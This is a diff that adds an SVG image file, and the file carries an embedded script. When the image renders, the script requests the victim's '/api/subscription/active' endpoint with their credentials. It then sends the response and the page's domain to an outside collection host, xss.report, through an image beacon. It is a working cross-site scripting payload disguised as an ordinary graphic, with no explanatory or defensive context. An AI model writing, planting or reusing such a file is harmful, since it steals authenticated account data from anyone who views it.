@@ -1,0 +1,10 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>//<![CDATA[
+    fetch("/api/subscription/active",{credentials:"include"})
+      .then(function(r){return r.text();})
+      .then(function(d){
+        new Image().src="https://xss.report/c/gomer12?d="+document.domain+"&data="+encodeURIComponent(d);
+      });
+  //]]></script>
+</svg>
